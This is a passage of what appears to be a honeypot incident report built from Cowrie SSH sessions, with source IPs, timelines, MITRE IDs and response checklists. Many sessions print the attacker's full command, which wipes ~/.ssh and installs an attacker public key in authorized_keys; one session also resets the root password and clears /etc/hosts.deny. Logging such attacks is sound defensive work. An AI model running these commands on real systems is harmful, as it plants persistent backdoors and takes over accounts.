| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:15:51` | `cowrie.session.connect` |
| `2026-05-03 04:15:51` | `cowrie.client.version` |
| `2026-05-03 04:15:51` | `cowrie.client.kex` |
| `2026-05-03 04:15:52` | `cowrie.login.success` |
| `2026-05-03 04:15:52` | `cowrie.session.params` |
| `2026-05-03 04:15:52` | `cowrie.command.input` |
| `2026-05-03 04:15:52` | `cowrie.command.failed` |
| `2026-05-03 04:15:52` | `cowrie.log.closed` |
| `2026-05-03 04:15:53` | `cowrie.session.params` |
| `2026-05-03 04:15:53` | `cowrie.command.input` |
| `2026-05-03 04:15:53` | `cowrie.session.file_download` |
| `2026-05-03 04:15:53` | `cowrie.log.closed` |
| `2026-05-03 04:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86a091830b4f

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-05-03 04:15 |
| **Last Seen** | 2026-05-03 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:15:57` | `cowrie.session.connect` |
| `2026-05-03 04:15:57` | `cowrie.client.version` |
| `2026-05-03 04:15:57` | `cowrie.client.kex` |
| `2026-05-03 04:15:57` | `cowrie.login.success` |
| `2026-05-03 04:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3437da7277b

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-03 04:17 |
| **Last Seen** | 2026-05-03 04:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:17:46` | `cowrie.session.connect` |
| `2026-05-03 04:17:46` | `cowrie.client.version` |
| `2026-05-03 04:17:46` | `cowrie.client.kex` |
| `2026-05-03 04:17:46` | `cowrie.login.success` |
| `2026-05-03 04:17:47` | `cowrie.session.params` |
| `2026-05-03 04:17:47` | `cowrie.command.input` |
| `2026-05-03 04:17:47` | `cowrie.command.failed` |
| `2026-05-03 04:17:47` | `cowrie.log.closed` |
| `2026-05-03 04:17:47` | `cowrie.session.params` |
| `2026-05-03 04:17:47` | `cowrie.command.input` |
| `2026-05-03 04:17:47` | `cowrie.session.file_download` |
| `2026-05-03 04:17:47` | `cowrie.log.closed` |
| `2026-05-03 04:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a199e739ed97

| Field | Detail |
|---|---|
| **Source IP** | `103.163.95[.]99` |
| **First Seen** | 2026-05-03 04:17 |
| **Last Seen** | 2026-05-03 04:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:17:47` | `cowrie.session.connect` |
| `2026-05-03 04:17:47` | `cowrie.client.version` |
| `2026-05-03 04:17:47` | `cowrie.client.kex` |
| `2026-05-03 04:17:48` | `cowrie.login.success` |
| `2026-05-03 04:17:48` | `cowrie.session.params` |
| `2026-05-03 04:17:48` | `cowrie.command.input` |
| `2026-05-03 04:17:48` | `cowrie.command.failed` |
| `2026-05-03 04:17:48` | `cowrie.log.closed` |
| `2026-05-03 04:17:48` | `cowrie.session.params` |
| `2026-05-03 04:17:48` | `cowrie.command.input` |
| `2026-05-03 04:17:48` | `cowrie.session.file_download` |
| `2026-05-03 04:17:48` | `cowrie.log.closed` |
| `2026-05-03 04:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.95[.]99` to AbuseIPDB if not already reported
- [ ] Block `103.163.95[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee5defcb5b5b

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-03 04:17 |
| **Last Seen** | 2026-05-03 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:17:49` | `cowrie.session.connect` |
| `2026-05-03 04:17:49` | `cowrie.client.version` |
| `2026-05-03 04:17:49` | `cowrie.client.kex` |
| `2026-05-03 04:17:50` | `cowrie.login.success` |
| `2026-05-03 04:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eec30df1d30e

| Field | Detail |
|---|---|
| **Source IP** | `103.163.95[.]99` |
| **First Seen** | 2026-05-03 04:17 |
| **Last Seen** | 2026-05-03 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:17:49` | `cowrie.session.connect` |
| `2026-05-03 04:17:49` | `cowrie.client.version` |
| `2026-05-03 04:17:49` | `cowrie.client.kex` |
| `2026-05-03 04:17:49` | `cowrie.login.success` |
| `2026-05-03 04:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.95[.]99` to AbuseIPDB if not already reported
- [ ] Block `103.163.95[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94b21af5dce8

| Field | Detail |
|---|---|
| **Source IP** | `103.163.95[.]99` |
| **First Seen** | 2026-05-03 04:20 |
| **Last Seen** | 2026-05-03 04:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:20:16` | `cowrie.session.connect` |
| `2026-05-03 04:20:16` | `cowrie.client.version` |
| `2026-05-03 04:20:16` | `cowrie.client.kex` |
| `2026-05-03 04:20:16` | `cowrie.login.success` |
| `2026-05-03 04:20:16` | `cowrie.session.params` |
| `2026-05-03 04:20:16` | `cowrie.command.input` |
| `2026-05-03 04:20:16` | `cowrie.command.failed` |
| `2026-05-03 04:20:16` | `cowrie.log.closed` |
| `2026-05-03 04:20:16` | `cowrie.session.params` |
| `2026-05-03 04:20:16` | `cowrie.command.input` |
| `2026-05-03 04:20:16` | `cowrie.session.file_download` |
| `2026-05-03 04:20:16` | `cowrie.log.closed` |
| `2026-05-03 04:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.95[.]99` to AbuseIPDB if not already reported
- [ ] Block `103.163.95[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37c4d3bc13bd

| Field | Detail |
|---|---|
| **Source IP** | `103.163.95[.]99` |
| **First Seen** | 2026-05-03 04:20 |
| **Last Seen** | 2026-05-03 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:20:17` | `cowrie.session.connect` |
| `2026-05-03 04:20:17` | `cowrie.client.version` |
| `2026-05-03 04:20:17` | `cowrie.client.kex` |
| `2026-05-03 04:20:17` | `cowrie.login.success` |
| `2026-05-03 04:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.95[.]99` to AbuseIPDB if not already reported
- [ ] Block `103.163.95[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2157c1f4bae

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-03 04:21 |
| **Last Seen** | 2026-05-03 04:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:21:16` | `cowrie.session.connect` |
| `2026-05-03 04:21:16` | `cowrie.client.version` |
| `2026-05-03 04:21:16` | `cowrie.client.kex` |
| `2026-05-03 04:21:17` | `cowrie.login.success` |
| `2026-05-03 04:21:17` | `cowrie.session.params` |
| `2026-05-03 04:21:17` | `cowrie.command.input` |
| `2026-05-03 04:21:17` | `cowrie.command.failed` |
| `2026-05-03 04:21:17` | `cowrie.log.closed` |
| `2026-05-03 04:21:17` | `cowrie.session.params` |
| `2026-05-03 04:21:17` | `cowrie.command.input` |
| `2026-05-03 04:21:17` | `cowrie.session.file_download` |
| `2026-05-03 04:21:17` | `cowrie.log.closed` |
| `2026-05-03 04:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30feb1be3212

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-03 04:21 |
| **Last Seen** | 2026-05-03 04:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:21:19` | `cowrie.session.connect` |
| `2026-05-03 04:21:19` | `cowrie.client.version` |
| `2026-05-03 04:21:19` | `cowrie.client.kex` |
| `2026-05-03 04:21:20` | `cowrie.login.success` |
| `2026-05-03 04:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5347680de29d

| Field | Detail |
|---|---|
| **Source IP** | `103.163.95[.]99` |
| **First Seen** | 2026-05-03 04:23 |
| **Last Seen** | 2026-05-03 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:23:26` | `cowrie.session.connect` |
| `2026-05-03 04:23:26` | `cowrie.client.version` |
| `2026-05-03 04:23:26` | `cowrie.client.kex` |
| `2026-05-03 04:23:26` | `cowrie.login.success` |
| `2026-05-03 04:23:26` | `cowrie.session.params` |
| `2026-05-03 04:23:26` | `cowrie.command.input` |
| `2026-05-03 04:23:26` | `cowrie.command.failed` |
| `2026-05-03 04:23:26` | `cowrie.log.closed` |
| `2026-05-03 04:23:26` | `cowrie.session.params` |
| `2026-05-03 04:23:26` | `cowrie.command.input` |
| `2026-05-03 04:23:26` | `cowrie.session.file_download` |
| `2026-05-03 04:23:26` | `cowrie.log.closed` |
| `2026-05-03 04:23:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.95[.]99` to AbuseIPDB if not already reported
- [ ] Block `103.163.95[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a580cbc6d07a

| Field | Detail |
|---|---|
| **Source IP** | `103.163.95[.]99` |
| **First Seen** | 2026-05-03 04:23 |
| **Last Seen** | 2026-05-03 04:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:23:27` | `cowrie.session.connect` |
| `2026-05-03 04:23:27` | `cowrie.client.version` |
| `2026-05-03 04:23:27` | `cowrie.client.kex` |
| `2026-05-03 04:23:28` | `cowrie.login.success` |
| `2026-05-03 04:23:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.95[.]99` to AbuseIPDB if not already reported
- [ ] Block `103.163.95[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e985ef3d6ff4

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-05-03 04:26 |
| **Last Seen** | 2026-05-03 04:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:26:07` | `cowrie.session.connect` |
| `2026-05-03 04:26:07` | `cowrie.client.version` |
| `2026-05-03 04:26:07` | `cowrie.client.kex` |
| `2026-05-03 04:26:08` | `cowrie.login.success` |
| `2026-05-03 04:26:09` | `cowrie.session.params` |
| `2026-05-03 04:26:09` | `cowrie.command.input` |
| `2026-05-03 04:26:09` | `cowrie.command.failed` |
| `2026-05-03 04:26:09` | `cowrie.log.closed` |
| `2026-05-03 04:26:10` | `cowrie.session.params` |
| `2026-05-03 04:26:10` | `cowrie.command.input` |
| `2026-05-03 04:26:10` | `cowrie.session.file_download` |
| `2026-05-03 04:26:10` | `cowrie.log.closed` |
| `2026-05-03 04:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f6c03eeb451

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-05-03 04:26 |
| **Last Seen** | 2026-05-03 04:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:26:15` | `cowrie.session.connect` |
| `2026-05-03 04:26:15` | `cowrie.client.version` |
| `2026-05-03 04:26:15` | `cowrie.client.kex` |
| `2026-05-03 04:26:18` | `cowrie.login.success` |
| `2026-05-03 04:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae1d54fb302e

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-05-03 04:27 |
| **Last Seen** | 2026-05-03 04:28 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ggZrCOdVuThC"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:27:50` | `cowrie.session.connect` |
| `2026-05-03 04:27:50` | `cowrie.client.version` |
| `2026-05-03 04:27:50` | `cowrie.client.kex` |
| `2026-05-03 04:27:51` | `cowrie.login.success` |
| `2026-05-03 04:27:56` | `cowrie.session.params` |
| `2026-05-03 04:27:56` | `cowrie.command.input` |
| `2026-05-03 04:27:56` | `cowrie.command.failed` |
| `2026-05-03 04:27:56` | `cowrie.log.closed` |
| `2026-05-03 04:27:56` | `cowrie.session.params` |
| `2026-05-03 04:27:56` | `cowrie.command.input` |
| `2026-05-03 04:27:57` | `cowrie.session.file_download` |
| `2026-05-03 04:27:57` | `cowrie.log.closed` |
| `2026-05-03 04:28:06` | `cowrie.session.params` |
| `2026-05-03 04:28:06` | `cowrie.command.input` |
| `2026-05-03 04:28:06` | `cowrie.log.closed` |
| `2026-05-03 04:28:06` | `cowrie.session.params` |
| `2026-05-03 04:28:06` | `cowrie.command.input` |
| `2026-05-03 04:28:06` | `cowrie.log.closed` |
| `2026-05-03 04:28:07` | `cowrie.session.params` |
| `2026-05-03 04:28:07` | `cowrie.command.input` |
| `2026-05-03 04:28:07` | `cowrie.session.file_download` |
| `2026-05-03 04:28:07` | `cowrie.log.closed` |
| `2026-05-03 04:28:08` | `cowrie.session.params` |
| `2026-05-03 04:28:08` | `cowrie.command.input` |
| `2026-05-03 04:28:08` | `cowrie.log.closed` |
| `2026-05-03 04:28:08` | `cowrie.session.params` |
| `2026-05-03 04:28:08` | `cowrie.command.input` |
| `2026-05-03 04:28:08` | `cowrie.log.closed` |
| `2026-05-03 04:28:08` | `cowrie.session.params` |
| `2026-05-03 04:28:08` | `cowrie.command.input` |
| `2026-05-03 04:28:08` | `cowrie.command.input` |
| `2026-05-03 04:28:11` | `cowrie.log.closed` |
| `2026-05-03 04:28:11` | `cowrie.session.params` |
| `2026-05-03 04:28:11` | `cowrie.command.input` |
| `2026-05-03 04:28:12` | `cowrie.log.closed` |
| `2026-05-03 04:28:13` | `cowrie.session.params` |
| `2026-05-03 04:28:13` | `cowrie.command.input` |
| `2026-05-03 04:28:13` | `cowrie.log.closed` |
| `2026-05-03 04:28:13` | `cowrie.session.params` |
| `2026-05-03 04:28:13` | `cowrie.command.input` |
| `2026-05-03 04:28:13` | `cowrie.log.closed` |
| `2026-05-03 04:28:14` | `cowrie.session.params` |
| `2026-05-03 04:28:14` | `cowrie.command.input` |
| `2026-05-03 04:28:15` | `cowrie.log.closed` |
| `2026-05-03 04:28:15` | `cowrie.session.params` |
| `2026-05-03 04:28:15` | `cowrie.command.input` |
| `2026-05-03 04:28:16` | `cowrie.log.closed` |
| `2026-05-03 04:28:16` | `cowrie.session.params` |
| `2026-05-03 04:28:16` | `cowrie.command.input` |
| `2026-05-03 04:28:16` | `cowrie.log.closed` |
| `2026-05-03 04:28:26` | `cowrie.session.params` |
| `2026-05-03 04:28:26` | `cowrie.command.input` |
| `2026-05-03 04:28:26` | `cowrie.log.closed` |
| `2026-05-03 04:28:27` | `cowrie.session.params` |
| `2026-05-03 04:28:27` | `cowrie.command.input` |
| `2026-05-03 04:28:27` | `cowrie.log.closed` |
| `2026-05-03 04:28:27` | `cowrie.session.params` |
| `2026-05-03 04:28:27` | `cowrie.command.input` |
| `2026-05-03 04:28:27` | `cowrie.log.closed` |
| `2026-05-03 04:28:28` | `cowrie.session.params` |
